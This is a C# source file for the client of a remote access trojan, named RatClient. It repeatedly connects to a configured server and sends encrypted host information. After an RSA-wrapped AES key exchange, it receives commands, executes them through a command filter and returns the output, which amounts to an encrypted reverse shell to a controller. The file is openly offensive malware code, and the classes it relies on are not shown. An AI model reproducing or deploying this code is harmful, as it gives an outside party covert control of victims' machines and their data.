using RatClient.SymetricCrypto;
using RatClient.AcRSA;
using System.Numerics;
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using static Info;


namespace RatClient
{

    internal class Client
    {
        private BigInteger[] PublicKey;
        private Tuple<string, int> servInfo;
        private AESCyrpto Acaes;
        private TcpClient client;
        string serverIP;
        int Port;

        public Client(string serverIP, int Port, BigInteger[] PublicKey)
        {
            this.PublicKey = PublicKey;
            this.serverIP = serverIP;
            this.Port = Port;
            Resetor();
        }

        private static byte[] SerializeToJson<T>(T obj)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(T));
                serializer.WriteObject(ms, obj);
                return ms.ToArray();
            }
        }

        private void SendClientInfo()
        {
            byte[] data = ACRSA.Encrypt(SerializeToJson(new ClientInfo()), PublicKey);   
            client.GetStream().Write(data, 0, data.Length);
            Console.WriteLine("end Sending");
        }

        private void SendMsg(byte[] msg)
        {
            byte[] enc = Acaes.Encrypt(msg);
            byte[] buffer = BitConverter.GetBytes(enc.Length);
            Array.Reverse(buffer);
            client.GetStream().Write(buffer, 0, 4);
            client.GetStream().Write(enc, 0, enc.Length);
        }
        private byte[] ReadMsg()
        {
            byte[] headerBytes = new byte[4];
            client.GetStream().Read(headerBytes, 0, 4);
            Array.Reverse(headerBytes);
            int header = BitConverter.ToInt32(headerBytes, 0);
            byte[] res = new byte[header];
            int bytesRead = client.GetStream().Read(res, 0, header);
            while (bytesRead < header)
            {
                bytesRead += client.GetStream().Read(res, bytesRead, header - bytesRead);
            }
            return Acaes.Decrypt(res);
        }

        private void Resetor()
        {
            while (true)
            {
                try
                {
                    this.servInfo = new Tuple<string, int>(serverIP, Port);
                    this.client = new TcpClient(serverIP, Port);
                    this.Acaes = new AESCyrpto(null, null);
                    SendClientInfo();
                    Console.WriteLine("Completed!");
                    return;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"{ex.Message}");
                }
                {
                    Thread.Sleep(3000);
                }
            }
        }

        private void SetSyncAes()
        {
            byte[] symKey = Acaes.RandomKey();
            byte[] iv = Acaes.randomIV(symKey);
            Acaes = new AESCyrpto(symKey, iv);
            byte[] msg = ACRSA.Encrypt(symKey, PublicKey);
            Console.WriteLine(Encoding.UTF8.GetString(msg));
            client.GetStream().Write(msg, 0, msg.Length);
        }

        public void Handle()
        {
            while (true)
            {
                try
                {
                    byte[] msg = new byte[32];
                    int bytesRead = client.GetStream().Read(msg, 0, msg.Length);
                    string receivedMsg = Encoding.ASCII.GetString(msg).Trim();

                    if (bytesRead > 10)
                    {
                        Console.WriteLine("StartingShell");
                        Start();
                    }
                    else if (bytesRead > 0)
                    {
                        byte[] randomBytes = new byte[1];
                        using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) 
                        {
                            rng.GetBytes(randomBytes);
                        }
                        client.GetStream().Write(randomBytes, 0, randomBytes.Length);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    Resetor();
                }
                Thread.Sleep(1000);
            }
        }
        private void Start()
        {
            FilterCommands filter = new FilterCommands();
            SetSyncAes();
            while (true)
            {
                try
                {
                    string command = Encoding.UTF8.GetString(ReadMsg());
                    System.Console.WriteLine(command);
                    if (command == "exit")
                    {
                        Console.WriteLine("Ending Session");
                        break;
                    }
                    byte[] output = filter.Run(command);
                    SendMsg(output);
                }
                catch
                {
                    return;
                }
            }                
        }
    }
}
